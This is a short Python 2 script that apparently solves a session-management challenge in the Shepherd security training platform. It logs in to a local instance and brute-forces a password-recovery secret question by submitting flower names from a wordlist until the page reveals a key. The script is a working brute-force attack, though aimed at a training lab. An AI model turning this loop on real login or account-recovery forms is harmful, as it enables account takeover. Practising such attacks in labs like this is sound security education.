#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
  solution.py 
  Solution to Shepherd Session_Management_Challenge_6 
"""
__author__ = 'mikael.kall@nighter.se'

import requests
import sys
import os
import re

# SETTINGS
AUTH_URL  = 'http://localhost:8080'
AUTH_USER = ''
AUTH_PASS = ''
# Post url
POST_URL = "%s/challenges/269d55bc0e0ff635dcaeec8533085e5eae5d25e8646dcd4b05009353c9cf9c80SecretQuestion" % AUTH_URL

FLOWERS = ['Franklin Tree']
EMAIL='elitehacker@shepherd.com'

# Load dict
try: 
    with open('./flowers_dict.txt') as f: 
        FLOWERS = f.read().splitlines()
except:
    pass


def authenticate():

    session = requests.session()
    postData = {"login": AUTH_USER, "pwd":AUTH_PASS,"submit":"Submit"}
    session.post(AUTH_URL[:-4], postData)
    if session is None:
        return False
    else:
        return session


def bruteforce():
    session = authenticate()
    rex = re.compile(r'.*<textarea.*>(.*)</textarea>.*',re.S|re.M)

    for flower in FLOWERS:
        postData = {"subEmail":EMAIL, "subAnswer":flower}
        r = session.post(POST_URL, data=postData)

        if 'The result key is' in r.text:
            match = rex.match(r.text)
            print "Flower: %s | key: %s" % (flower, match.groups()[0].strip())
            break
        else:
            print "Wrong answer: %s" % str(flower)


if __name__ == '__main__':
    bruteforce()
